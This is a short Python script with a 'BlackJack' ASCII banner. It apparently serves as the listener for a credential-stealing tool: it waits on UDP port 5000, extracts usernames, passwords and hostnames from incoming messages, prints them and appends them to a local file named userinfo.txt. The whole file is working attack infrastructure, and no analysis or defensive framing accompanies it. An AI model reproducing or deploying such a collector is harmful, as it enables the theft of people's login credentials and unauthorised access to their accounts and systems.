import socket
import re
a = """
				____  _            _       _            _    
				| __ )| | __ _  ___| | __  | | __ _  ___| | __
				|  _ \| |/ _` |/ __| |/ /  | |/ _` |/ __| |/ /
				| |_) | | (_| | (__|   < |_| | (_| | (__|   < 
				|____/|_|\__,_|\___|_|\_\___/ \__,_|\___|_|\_\


	.______________________________________________________|_._._._._._._._._._.
	 \_____________________________________________________|_|_|_|_|_|_|_|_|_|_|
														   |

	"""
port = 5000
print(a)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("", port))
print("waiting on port:", port)
while 1:
	data, addr = s.recvfrom(1024)
	print(data)
	credentials = data
	credentials = str(credentials)
	password = credentials.split("P: ",1)[1] 
	username = credentials.split("U:",1)[1] 
	start = 'U:'
	end = 'P:'
	strin = username
	username =  strin[strin.find(start)+len(start):strin.rfind(end)]
	start = 'P:'
	end = 'H:'
	password =  password[password.find(start)+len(start):password.rfind(end)]
	host = credentials.split("H: ",1)[1] 
	host = host[:-1]
	print(host)
	print(username)
	print(password)
	f = open("userinfo.txt", "a")
	texttowrite = username + " " + password + " " + host + "\n"
	with open("userinfo.txt", "a") as f:
		f.write(texttowrite)